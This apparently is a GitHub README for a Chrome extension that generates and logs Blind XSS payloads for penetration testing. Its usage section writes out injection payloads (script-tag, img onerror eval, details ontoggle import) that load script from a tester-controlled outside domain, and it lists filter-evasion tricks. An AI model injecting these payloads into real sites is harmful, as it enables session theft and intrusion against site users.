# Blind XSS Manager

A Chrome extension designed for efficient management of Blind XSS payloads, offering a streamlined interface and essential features for security testing.

Inspired by [SeifElsallamy's Blind-XSS-Manager.](https://github.com/SeifElsallamy/Blind-XSS-Manager)

Built with the assistance of AI.

## 🚀 Features

### Core Functionality
- **4 Essential Payloads** - Carefully selected XSS injection techniques
- **Dynamic Hash Generation** - Unique MD5-based hashes for each URL
- **Real-time URL Capture** - Automatically captures current tab URL
- **Domain Management** - Save and reuse your XSS domains
- **Comprehensive History** - Track all your injection attempts

### Payload Types
- **Script Tag** - Basic script injection technique
- **Image Tag** - Image-based XSS with base64 encoded payload
- **Details Tag** - HTML5 details element injection
- **Polyglot Payload** - Advanced multi-context injection vector

<img width="594" height="711" alt="Screenshot 2025-07-14 at 11 52 59 AM" src="https://github.com/user-attachments/assets/57a02139-a453-4fba-b412-b232cc807605" />


### History Management
- **Search Functionality** - Find specific entries quickly
- **Time-based Filtering** - Filter by today, week, month, or all time
- **Export Options** - Export as CSV, JSON, or TXT
- **Individual Entry Management** - Copy hashes, URLs, or delete specific entries
- **Statistics Dashboard** - View injection metrics

<img width="800" height="707" alt="Screenshot 2025-07-14 at 11 53 45 AM" src="https://github.com/user-attachments/assets/b1bd32d6-13ed-4eb5-8ef1-832bdc28e0ec" />


## 📦 Installation

### For Chrome/Chromium-based browsers:

1. Download or clone this repository
2. Open Chrome and navigate to `chrome://extensions/`
3. Enable "Developer mode" in the top right corner
4. Click "Load unpacked" and select the folder containing the extension files
5. The extension should now appear in your extensions list

## 🔧 Manifest V3 Compatibility

This extension uses Manifest V3, making it compatible with the latest versions of Chrome:

- ✅ **Modern Architecture** - Service worker background script
- ✅ **Enhanced Security** - Improved security model
- ✅ **Better Performance** - More efficient resource usage
- ✅ **Future-Proof** - Uses latest Chrome extension APIs

## 🎯 Usage Guide

### Main Interface
1. **Configure Domain** - Enter your XSS domain (e.g., `*.xss.ht`)
2. **Auto-Capture** - Current URL and hash are automatically captured
3. **Generate Payloads** - Payloads are automatically generated with your domain and hash
4. **Copy Payloads** - Copy individual payloads or all at once
5. **View Statistics** - Monitor your injection metrics

### Payload Management
- **Script Tag**: `"><script src=https://domain?n=hash></script>`
- **Image Tag**: `"><img src=x id=base64_encoded onerror=eval(atob(this.id))>`
- **Details Tag**: `-->"//'//></script><details/open/ontoggle="import('https://domain?n=hash')">`
- **Polyglot Payload**: Advanced multi-context injection with various encoding techniques

### History Management
1. **View All Entries** - Complete injection history with timestamps
2. **Search & Filter** - Find specific entries by URL, hash, or domain
3. **Export Data** - Multiple export formats available (CSV, JSON, TXT)
4. **Individual Actions** - Copy hashes, URLs, or delete specific entries
5. **Clear All** - Remove all history entries

## 📁 File Structure

```
Blind-XSS-Manager/
├── manifest.json          # Extension manifest (Manifest V3)
├── popup.html            # Main extension interface
├── popup.js              # Core functionality and payload generation
├── background.js         # Service worker for background tasks
├── content.js            # Content script for web page interaction
├── history.html          # History view interface
├── history.js            # History management functionality
├── icon.png              # Extension icon
└── README.md             # This file
```

## 🔒 Security Features

### Payload Techniques
- **Script Injection** - Direct script tag injection
- **Image-based XSS** - Using image onerror events with base64 encoding
- **HTML5 Elements** - Modern browser features for injection
- **Polyglot Payloads** - Multi-context injection vectors with advanced encoding

### Advanced Techniques
- Base64 encoding for payload obfuscation
- Mixed-case evasion techniques
- Unicode normalization
- Character code obfuscation
- Multi-context compatibility

## ⚙️ Configuration

### Domain Setup
- Enter your XSS domain (e.g., `*.xss.ht`)
- Domain is automatically saved for future use
- Used in all generated payloads

### Hash Generation
- Unique MD5 hash generated for each URL
- Automatically captured from current tab
- Used as nonce parameter in payloads

## 🛠️ Troubleshooting

### Common Issues
1. **Extension won't load**
   - Ensure Developer mode is enabled
   - Check that all files are present
   - Verify Chrome version compatibility

2. **Payloads not generating**
   - Check domain configuration
   - Ensure current URL is accessible
   - Verify extension permissions

3. **History not saving**
   - Check storage permissions
   - Verify sync is enabled
   - Clear and reload extension

### Browser Compatibility
- ✅ Chrome 88+
- ✅ Chromium-based browsers
- ✅ Edge (Chromium)
- ✅ Brave Browser
- ❌ Firefox 

## 📝 License

This project is designed for security testing and penetration testing purposes. Use responsibly and only on systems you have permission to test.

## ⚠️ Disclaimer

This tool is intended for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before testing any systems. The developers are not responsible for any misuse of this tool.
